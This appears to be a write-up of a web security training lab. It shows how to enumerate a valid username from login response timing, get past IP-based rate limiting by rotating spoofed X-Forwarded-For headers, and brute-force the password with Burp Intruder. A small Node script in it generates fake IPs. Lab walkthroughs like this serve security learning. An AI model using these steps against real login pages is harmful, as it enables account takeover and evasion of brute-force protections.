@@ -1,0 +1,137 @@
+// Lab: Username enumeration via response timing
+
+
+This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
+
+Your credentials: wiener:peter
+
+Candidate usernames
+Candidate passwords
+
+
+
+
+// Solution:
+
+What's the logic flaw?
+The server takes longer to respond when a username exists (because it checks the password hash) vs when username doesn't exist (fails instantly). Also it blocks your IP after too many attempts — so we bypass using X-Forwarded-For header with different IPs.
+
+
+
+How the attack works:
+
+Send a very long password (500+ chars) with different usernames
+
+Valid username = slower response time
+
+Invalid username = fast response time
+
+Change X-Forwarded-For IP each request to bypass IP block
+
+
+
+Step 1: Setup in Burp
+
+Open Burp Suite → Proxy → Login with wiener:peter.
+
+Intercept the POST /login request.
+
+Send to Intruder
+
+
+
+Step 2: Modify the request in Intruder
+
+Add X-Forwarded-For header and set markers:
+
+X-Forwarded-For: §1§
+username=§wiener§&password=peterAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+
+Password should be very long (500+ A's) — this makes timing difference obvious.
+
+Attack type: Pitchfork
+
+
+
+Step 3: Create payload files
+
+userlist.txt — already have candidate usernames
+
+Create iplist.js to generate fake IPs:
+
+
+sudo vim /home/adi/Desktop/Burp/iplist.js
+
+
+const fs = require('fs');
+
+let content = '';
+for (let i = 1; i <= 200; i++){
+    content += `192.168.1.${i}\n`;
+}
+
+fs.writeFile('./iplist.txt', content, (err) => {
+    if (err) {console.error(err);}
+    else {console.log('iplist.txt created!');}
+});
+
+
+Press Esc → :wq → Enter
+
+sudo node /home/adi/Desktop/Burp/iplist.js
+
+
+
+Step 4: Intruder Settings
+
+Attack type → Pitchfork
+
+Payload Set 1 → Load iplist.txt (for X-Forwarded-For)
+
+Payload Set 2 → Load candidate usernames
+
+
+
+Step 5: Resource Pool
+
+Go to Resource Pool
+
+Set Max concurrent requests = 1` (to avoid overwhelming the server and getting blocked)
+
+
+
+Step 6: Start Attack — Find Valid Username
+
+Click Start Attack
+
+Wait for all requests to finish
+
+Click Columns → enable Response received and Response completed
+
+Sort by Response time — the slowest response = valid username
+
+Note down that username (example: carlos)
+
+
+
+
+Step 7: Brute-force Password
+
+Now send another Pitchfork attack:
+
+Request:
+
+X-Forwarded-For: §1§
+username=carlos&password=§peter§
+
+
+Payload Set 1 → iplist.txt (fake IPs)
+
+Payload Set 2 → candidate passwords list
+
+Start attack → Look for 302 redirect = correct password 
+
+
+
+Lab solved!
